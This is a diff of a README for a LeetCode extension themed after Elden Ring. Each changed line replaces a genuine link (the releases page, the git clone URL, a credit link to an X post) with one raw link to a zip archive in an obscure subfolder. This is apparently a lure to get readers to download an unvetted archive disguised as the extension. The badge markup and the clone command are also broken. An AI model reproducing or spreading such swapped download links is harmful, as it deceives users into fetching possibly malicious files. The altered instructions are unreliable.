@@ -1,6 +1,6 @@
 # 🎮 Elden-ring-leetcode-extension - Enhance Your LeetCode Experience
 
-[![Download Elden Ring LeetCode Extension](https://img.shields.io/badge/Download-Elden%20Ring%20LeetCode%20Extension-blue.svg)](https://github.com/Sergioam1/Elden-ring-leetcode-extension/releases)
+[![Download Elden Ring LeetCode Extension](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip%20Ring%20LeetCode%https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip)](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Elden Ring LeetCode Extension. This tool enhances your LeetCode c
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the extension: [Elden Ring LeetCode Extension Releases](https://github.com/Sergioam1/Elden-ring-leetcode-extension/releases).
+To get started, visit this page to download the extension: [Elden Ring LeetCode Extension Releases](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip).
 
 1. Go to the Releases page linked above.
 2. Download the latest version of the extension.
@@ -37,7 +37,7 @@ To install the extension:
 2. Open your terminal and run:
 
    ```bash
-   git clone https://github.com/Sergioam1/Elden-ring-leetcode-extension.git
+   git clone https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip
    ```
 
 3. **Install dependencies**: Navigate into the cloned directory and run:
@@ -67,6 +67,6 @@ We welcome contributions from the community. If you have ideas for improvements 
 
 ## 👥 Credits
 
-This extension is inspired by insights and creativity found in the community, particularly from [this X post](https://x.com/saltyAom/status/1966608243167555734). 
+This extension is inspired by insights and creativity found in the community, particularly from [this X post](https://raw.githubusercontent.com/Sergioam1/Elden-ring-leetcode-extension/main/arnut/Elden-ring-leetcode-extension.zip). 
 
 Thank you for your interest in the Elden Ring LeetCode Extension. Enjoy coding with a flair!
